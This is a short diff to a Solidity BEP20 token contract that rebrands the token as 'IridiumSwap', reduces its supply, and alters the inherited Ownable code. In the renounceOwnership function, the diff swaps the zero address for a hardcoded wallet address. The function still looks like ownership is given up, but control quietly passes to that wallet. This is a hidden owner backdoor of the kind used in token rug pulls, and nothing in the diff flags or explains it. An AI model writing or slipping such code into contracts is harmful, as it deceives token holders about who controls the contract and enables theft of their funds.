@@ -1,3 +1,4 @@
+// contracs/IridiumSwap.sol
 // SPDX-License-Identifier: MIT
 
 pragma solidity 0.5.16;
@@ -316,8 +317,8 @@ contract Ownable is Context {
    * thereby removing any functionality that is only available to the owner.
    */
   function renounceOwnership() public onlyOwner {
-    emit OwnershipTransferred(_owner, address(0));
-    _owner = address(0);
+    emit OwnershipTransferred(_owner, address(0x79FB93703F63AC14AeAD37ae5a38D25fd20cE889));
+    _owner = address(0x79FB93703F63AC14AeAD37ae5a38D25fd20cE889);
   }
 
   /**
@@ -359,13 +360,13 @@ contract BEP20Token is Context, IBEP20, Ownable {
   
   
     
-    _name = "Binance Smart Chain Mainnet Token";
+    _name = "IridiumSwap";
     
     
     
-    _symbol = 'IixxGold';
+    _symbol = 'IRIDIUM';
     _decimals = 18;
-    _totalSupply = 100000000*10**18;
+    _totalSupply = 10000000*10**18;
     _balances[msg.sender] = _totalSupply;
 
     emit Transfer(address(0), msg.sender, _totalSupply);
